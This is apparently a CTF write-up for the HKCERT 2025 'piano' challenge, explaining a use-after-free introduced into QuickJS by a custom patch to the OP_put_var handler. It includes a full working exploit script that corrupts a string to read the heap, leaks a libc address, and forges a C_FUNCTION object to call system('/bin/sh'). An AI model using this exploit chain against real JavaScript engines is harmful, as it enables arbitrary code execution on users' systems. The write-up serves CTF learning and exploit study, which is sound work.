---
layout: post
title:  "piano - UAF in QuickJS @ HKCERT 2025 Quals"
date:   2025-12-22 00:00:00 +0000
categories: writeups
description: "Exploiting a custom CTF patch in QuickJS to achieve RCE(and a flag)"
---

## Epilogue

![minipif](/img/piano-writeup/piano_pif.png)
that's all he had to say🥀

## Bug overview

This challenge provides us with a custom patch to [QuickJS](https://github.com/bellard/quickjs), a lightweight JavaScript engine written by [Fabrice Bellard](https://bellard.org/) himself(author of QEMU among other things). 

```diff
diff --git a/quickjs.c b/quickjs.c
index 6f461d6..98d0cbe 100644
--- a/quickjs.c
+++ b/quickjs.c
@@ -18123,15 +18123,14 @@ static JSValue JS_CallInternal(JSContext *caller_ctx, JSValueConst func_obj,
                         }
                         ret = JS_SetPropertyInternal(ctx, ctx->global_obj, cv->var_name, sp[-1],
                                                      ctx->global_obj, JS_PROP_THROW_STRICT);
-                        sp--;
                         if (ret < 0)
                             goto exception;
                     }
                 } else {
                 put_var_ok:
                    set_value(ctx, var_ref->pvalue, sp[-1]);
-                   sp--;
                 }
+                sp--;
             }
             BREAK;
         CASE(OP_get_loc):
```

The patch introduces a vulnerability in the `OP_put_var` opcode handler. It's not entirely relevant to understand the whole implementation of this opcode, but rather to focus on the changes made by the patch. Two stack pointer(`sp`) decrements were removed and replaced with a single decrement at the end of the handler. **If the handler quits early via a `goto` statement, the stack pointer will not be decremented as expected**. This leads to a dangling reference on the stack which can be exploited when combined with `goto exception`. Why? Because `exception` handling code will free objects(via `JS_FreeValue`) on the stack, including the dangling reference, thus leading to a use-after-free vulnerability.

```C
exception:
    ...
    if (!rt->current_exception_is_uncatchable) {
        while (sp > stack_buf) {
            JSValue val = *--sp;
            JS_FreeValue(ctx, val);
            if (JS_VALUE_GET_TAG(val) == JS_TAG_CATCH_OFFSET) {
                int pos = JS_VALUE_GET_INT(val);
                if (pos == 0) {
                    /* enumerator: close it with a throw */
                    JS_FreeValue(ctx, sp[-1]); /* drop the next method */
                    sp--;
                    JS_IteratorClose(ctx, sp[-1], TRUE);
                } else {
                    *sp++ = rt->current_exception;
                    rt->current_exception = JS_UNINITIALIZED;
                    pc = b->byte_code_buf + pos;
                    goto restart;
                }
            }
        }
    }
    ...
```

In order to trigger the vulnerability, we must find a way to cause an exception in `OP_put_var`. More specifically, we need to make `JS_SetPropertyInternal` return a negative value. An easy way to achieve this is to create a global property with a setter that throws an exception:

```javascript
Object.defineProperty(globalThis, "x", {
    set: function(v) {
        throw "boom";
    }
});

let arr1 = new ArrayBuffer(0x200);
try {
    x = arr1;
} catch (e) {}
// now arr1 is freed but we still have a reference to it
```

Now, arr1 is freed on the heap, but we still have a reference to it accessible from JS.

## Exploitation

With the use-after-free primitive, we can now proceed to exploitation. Our target is to allocate other objects on top of the chunk of memory previously occupied by arr1, enabling us to reference them via the dangling pointer.

For example:

```javascript
Object.defineProperty(globalThis, "x", {
    set: function(v) {
        throw "boom";
    }
});

let arr1 = ["bruh", "moment"];
try {
    x = arr1;
} catch (e) {}
let arr2 = ["bruh", "moment"];
```

arr1 and arr2 point to the same object in memory. In this case, the double reference is not very useful. However, if we manage to make the dangling pointer point to some internal structure of another object(preferably one that we can control), we can fake an object!

I've tried a multitude of things to achieve this, but the most straightforward way ended up being related to `ArrayBuffer`. 

In QuickJS, an `ArrayBuffer` looks like this memory-wise(_quickjs.c:926_):
- a 0x50 sized chunks is allocated for `struct JSObject`
- then the `JSObject` structure contains a union `u` which has a member `struct JSArrayBuffer *array_buffer`
- in turn, `struct JSArrayBuffer` contains a pointer to the actual `data` buffer alongside other metadata like the length

Note that a `JSObject` contains other fields and pointers(like `shape` or `prop`) but I only enumerated ones related to `ArrayBuffer`.

With this knowledge, our goal is to obtain a dangling pointer to the same chunk of memory occupied by the `data` buffer of an `ArrayBuffer`, so that we can craft any fake object we want by controlling its internal structure using a `DataView` over said `ArrayBuffer`.

There is one more mechanism that is worth noting in QuickJS: `struct JSValue`.

_quickjs.h:217_
```C
typedef union JSValueUnion {
    int32_t int32;
    double float64;
    void *ptr;
#if JS_SHORT_BIG_INT_BITS == 32
    int32_t short_big_int;
#else
    int64_t short_big_int;
#endif
} JSValueUnion;

typedef struct JSValue {
    JSValueUnion u;
    int64_t tag;
} JSValue;
```

When using object references, the VM's stack actually contains `JSValue` structures. Hence, if we trigger the bug on a string reference(a `JSValue` with the string specific tag), even if it overlaps with an `ArrayBuffer`'s data buffer and we manage to fake an entire different object type, it will still be interpreted as a string by the engine.

From here on, we start to smell the exploit's design. We could leak a heap pointer by freeing the dangling reference again and then we could try to fake an entire array object that can do arbitrary read/write on the heap. In the end, I did not take this route because: heap object positions are not necessarily deterministic between runs and different between the handout binary and my debugging build from source, a hassle to calculate offsets for.

Instead, here is my exploit plan:
1. Get a dangling reference with string tag pointing to an `ArrayBuffer`'s data buffer
    - create `ArrayBuffer` of size 0x200 -> 0x210 chunk gets allocated for data
    - free it via the bug
    - allocate a string of an adequate size so that it will fill the same chunk(literal strings are immutable and their whole data is stored inline in the chunk)
2. Because string data is stored inline with their metadata(including length), we can now modify the string's length field(via a `DataView`) to a very large value, allowing us to read out-of-bounds on the heap.
3. Get libc leak via out-of-bounds read
    - allocate a very large `ArrayBuffer`
    - free it using the bug
    - libc pointer to `main_arena` is located somewhere on the heap
    - scan the heap for this address using `.substr` on the corrupted string
4. Fake `C_FUNCTION` object to get RCE
    - repeat the dangling reference to `ArrayBuffer` data buffer trick, but this time, with an object instead of a string(so that we have an object tag)
    - craft a fake object of class `JS_CLASS_C_FUNCTION`

`C_FUNCTION` gets us RCE because, when called, it invokes this code path:

_quickjs.c:17219_
```javascript
func = p->u.cfunc.c_function;
switch(cproto) {
...
case JS_CFUNC_generic:
    ret_val = func.generic(ctx, this_obj, argc, arg_buf);
    break;
...
}
...
```

Everything here is under our control, so we can set `func.generic` to point to `system` in libc and set the first argument to `/bin/sh`!

## Full exploit code

```javascript
Object.defineProperty(globalThis, "x", {
    set: function(v) {
        throw "boom";
    }
});

// helper functions
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function ftoi_hex(val) {
    return "0x" + ftoi(val).toString(16);
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
// end helper functions

let arr1 = new ArrayBuffer(0x200);
// DebugPrintAddr(arr1);
try {
    x = arr1;
} catch (e) {}


for (let i = 10; i < 100; i++) {
    var str1 = i.toString().repeat(242) + "AAAAA";
    // DebugPrintAddr(str1);
    break;
}

// now str1 points to arr1's data pointer
// free him, gahdamski

try {
    x = str1;
} catch (e) {}

// DebugPrintAddr(str1);

let arr2 = new ArrayBuffer(0x200);
// DebugPrintAddr(arr2);

// now str1 points to arr2's data pointer and str1 can be fully faked

let dv = new DataView(arr2);

let header = 0x00130d00ffffffffn; // -1 ref count
dv.setBigUint64(0, header, true); // fake ArrayBuffer header

// ArrayBuffer.prototype.transfer.call(str1);

// DebugPrintAddr(str1);

try {
    x = str1;
} catch (e) {}

// now str1 is freed
// DebugPrintAddr(str1);
let heap_leak = dv.getBigUint64(0, true);
heap_leak = heap_leak << 12n;
console.log("leak: 0x" + heap_leak.toString(16));
// console.log(str1);

let strr = "10".toString().repeat(242) + "AAAAA";
// DebugPrintAddr(strr);
// DebugPrintAddr(str1);

dv.setBigUint64(0, 0x1000100100000002n, true); // long string header

let big_arr1 = new ArrayBuffer(0x10000);
let big_arr2 = new ArrayBuffer(0x10000);
let big_arr3 = new ArrayBuffer(0x10000);
try {
    x = big_arr1;
} catch (e) {
}
try {
    x = big_arr2;
} catch (e) {
}
try {
    x = big_arr3;
} catch (e) {
}

let libc_addr = 0n;
for (let i = 0x200; i < 0x200 + 0x10000; i += 8) {
    let val = strr.substr(i, 8);
    // check if this is a libc address
    // convert binary string to bigint
    let big_val = 0n;
    for (let j = 0; j < 8; j++) {
        big_val += BigInt(val.charCodeAt(j)) << BigInt(j * 8);
    }
    // check if MS 2 bytes are 0x0000 and the next 2 bytes are different
    // from leak address's next 2 bytes
    if ((big_val >> 48n) == 0n && ((big_val >> 32n) & 0xffffn) != ((heap_leak >> 32n) & 0xffffn) && (big_val >> 32n) != 0n) {
        libc_addr = big_val;
    }
    
}

console.log("libc leak: 0x" + libc_addr.toString(16));
let libc_base = libc_addr - 0x203b20n;
console.log("libc base: 0x" + libc_base.toString(16));

// create a new ArrayBuffer which we attempt on modifying
let caca_buf = new ArrayBuffer(0x200);
// DebugPrintAddr(strr);
// DebugPrintAddr(caca_buf);

let v0 = new Uint8Array([1,2,3,4]);
try {
    x = v0;
} catch (e) {
    
}
let v1 = new Uint8Array([5,6,7,8]);
let xx = new ArrayBuffer(0x40);
let dvx = new DataView(xx);

let system_addr = libc_base + 362320n;
let bin_sh_addr = libc_base + 1881135n;

dvx.setBigUint64(0, 0x000C000000000001n, true);
dvx.setBigUint64(0x8, 0n, true);
dvx.setBigUint64(0x10, 0n, true);
dvx.setBigUint64(0x18, 0n, true);
dvx.setBigUint64(0x20, 0n, true);
dvx.setBigUint64(0x28, 0n, true);
dvx.setBigUint64(0x30, bin_sh_addr, true);
dvx.setBigUint64(0x38, system_addr, true);

v0();
```

I'd also like to point out my helper function `DebugPrintAddr` that I used extensively to print out object addresses during debugging and also as a breakpoint target.

```C
static JSValue js_debug_print_addr(JSContext *ctx, JSValueConst this_val,
                                  int argc, JSValueConst *argv)
{
    void *p;
    (void)this_val;

    if (argc < 1)
        return JS_ThrowTypeError(ctx, "DebugPrintAddr: missing argument");

    switch (JS_VALUE_GET_TAG(argv[0])) {
    case JS_TAG_OBJECT:
    case JS_TAG_STRING:
    case JS_TAG_STRING_ROPE:
        break;
    default:
        return JS_ThrowTypeError(ctx, "DebugPrintAddr: argument must be an object or string");
    }

    p = JS_VALUE_GET_PTR(argv[0]);
    printf("%p\n", p);
    fflush(stdout);
    return JS_UNDEFINED;
}
```

## Prologue

So that's about it! Hope you enjoyed the writeup as much as I enjoyed solving the challenge and learning about how QuickJS works. See you in the next one!



